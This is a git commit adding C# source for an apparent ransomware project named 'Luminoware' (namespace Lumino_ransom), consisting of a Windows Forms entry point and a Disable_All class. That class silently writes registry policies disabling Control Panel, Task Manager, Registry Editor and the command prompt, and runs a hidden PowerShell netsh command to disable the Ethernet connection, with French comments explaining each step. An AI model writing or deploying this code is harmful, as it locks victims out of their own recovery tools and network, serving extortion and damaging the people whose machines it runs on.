be739684fc2e0cce0ac01e2914bcc2442d5329bf
Lumino-2-0 <123825334+Lumino-2-0@users.noreply.github.com>
2023-02-12 14:53:39 +0100

    Modification commentaires/Modification comments
    Petits ajouts + mise en page des commentaires
    Small additions + layout of comments

---
+++ Luminoware/Ransom + base/Program.cs
@@ -0,0 +1,52 @@
+﻿/*
+
+
+
+
+
+db        db    db   .88b  d88.   d888888b   d8b   db    .d88b.             d8888b.    .d8b.    d8b   db   .d8888.    .d88b.    .88b  d88. 
+88        88    88   88'YbdP`88     `88'     888o  88   .8P  Y8.            88  `8D   d8' `8b   888o  88   88'  YP   .8P  Y8.   88'YbdP`88 
+88        88    88   88  88  88      88      88V8o 88   88    88            88oobY'   88ooo88   88V8o 88   `8bo.     88    88   88  88  88 
+88        88    88   88  88  88      88      88 V8o88   88    88   C8888D   88`8b     88~~~88   88 V8o88     `Y8b.   88    88   88  88  88 
+88booo.   88b  d88   88  88  88     .88.     88  V888   `8b  d8'            88 `88.   88   88   88  V888   db   8D   `8b  d8'   88  88  88 
+Y88888P   ~Y8888P'   YP  YP  YP   Y888888P   VP   V8P    `Y88P'             88   YD   YP   YP   VP   V8P   `8888Y'    `Y88P'    YP  YP  YP 
+     __ __             __     
+    /\ \\ \          /'__`\   
+    \ \ \\ \        /\ \/\ \  
+     \ \ \\ \_      \ \ \ \ \ 
+      \ \__ ,__\ __  \ \ \_\ \
+       \/_/\_\_//\_\  \ \____/
+          \/_/  \/_/   \/___/ 
+                                  
+
+*/
+using System;
+using System.Windows.Forms;
+
+
+namespace Lumino_ransom
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+
+
+
+        static void Main()
+        {
+            try
+            {
+                
+                Application.EnableVisualStyles();
+                Application.SetCompatibleTextRenderingDefault(false);
+                Application.Run(new Form1());
+            }
+            catch (System.UnauthorizedAccessException) { }
+
+        }
+
+    }
+}
---
+++ Luminoware/System/Disable_All.cs
@@ -0,0 +1,104 @@
+﻿
+
+/*                                  ***|---------------------------------------------------------------------------------------------------------------|\*/
+using Microsoft.Win32;              /*\|                    Librairie pour créer des processus (System.Diagnostics) et                                 |\*/
+using System.Diagnostics;           /*\|                       pour modifier la base de registre (Microsoft.Win32)                                     |\*/
+/*                                  ***|---------------------------------------------------------------------------------------------------------------|\*/
+
+
+
+// namespace Lumino_ransom
+namespace Lumino_ransom
+{
+
+    // public class Disable_All
+    internal class Disable_All
+    {
+
+        public void Disable_Parameter() // Fonction pour désactiver les paramètres de sécurité
+        {
+            try
+            {
+
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(             //| --> Création de la clé de registre pour désactiver les paramètres
+                       @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");     //|
+                objRegistryKey.GetValue("NoControlPanel");                                  // Ouvre la clé de registre pour la modifier (NoControlPanel)
+                objRegistryKey.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);    // Désactive le panneau de configuration en modifiant la valeur de la clé de registre "NoControlPanel" à 1
+                objRegistryKey.Close();                                                     // Ferme la clé de registre
+            }
+            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
+            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
+        }
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        public void Internet_Dis() // Fonction pour désactiver la connexion internet
+        {
+            try
+            {
+                Process mtd = new Process();                                                                         // Création d'un nouveau processus
+                mtd.StartInfo.FileName = "powershell.exe";                                                           // On lui donne le nom du programme à exécuter ("powershell.exe"/ Powershell Windows)
+                mtd.StartInfo.Arguments = "/C netsh interface set interface name=\"Ethernet\" admin=Disabled";       // On lui donne les arguments à exécuter (Désactiver l'interface Ethernet) en code PowerShell
+                mtd.StartInfo.UseShellExecute = true;                                                                // On lui dit d'utiliser le shell
+                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                               // On lui dit de ne pas afficher la fenêtre
+                mtd.Start();                                                                                         // On lance le processus
+                mtd.Close();                                                                                         // On ferme le processus
+            }
+            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
+            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
+        }
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        public void Disble_Taskmgr() // Fonction pour désactiver le gestionnaire de tâches
+        {
+            try
+            {
+
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(          //| --> Création de la clé de registre pour désactiver le gestionnaire de tâches
+                       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");    //|
+                objRegistryKey.GetValue("DisableTaskMgr");                               // Ouvre la clé de registre pour la modifier (DisableTaskMgr)
+                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord); // Désactive le gestionnaire de tâches en modifiant la valeur de la clé de registre "DisableTaskMgr" à 1
+                objRegistryKey.Close();                                                  // Ferme la clé de registre
+            }
+            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
+            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
+
+        }
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        public void Disble_Registry() // Fonction pour désactiver l'éditeur de registre
+        {
+            try
+            {
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(                 //| --> Création de la clé de registre pour désactiver l'éditeur de registre
+       @"Software\Microsoft\Windows\CurrentVersion\Policies\System");                           //|
+                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);  // Désactive l'éditeur de registre en modifiant la valeur de la clé de registre "DisableRegistryTools" à 1
+
+                objRegistryKey.Close();                                                         // Ferme la clé de registre
+            }
+            catch (System.AccessViolationException) { }     // Si il y a une violation de l'accès, on ne fait rien
+            catch (System.UnauthorizedAccessException) { }  // Si on n'a pas l'autorisation, on ne fait rien
+
+        }
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+        public void Disble_CMD() // Fonction pour désactiver la console/terminal (CMD)
+        {
+            try
+            {
+                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(         //| --> Création de la clé de registre pour désactiver la console/terminal (CMD)
+        @"Software\Policies\Microsoft\Windows\System");                                 //|
+                objRegistryKey.SetValue("DisableCMD", "1", RegistryValueKind.DWord);    // Désactive la console/terminal (CMD) en modifiant la valeur de la clé de registre "DisableCMD" à 1
+
+                objRegistryKey.Close();                                                 // Ferme la clé de registre
+            }
+            catch (System.AccessViolationException) { }    // Si il y a une violation de l'accès, on ne fait rien
+            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation, on ne fait rien
+
+        }
+
+    }
+}
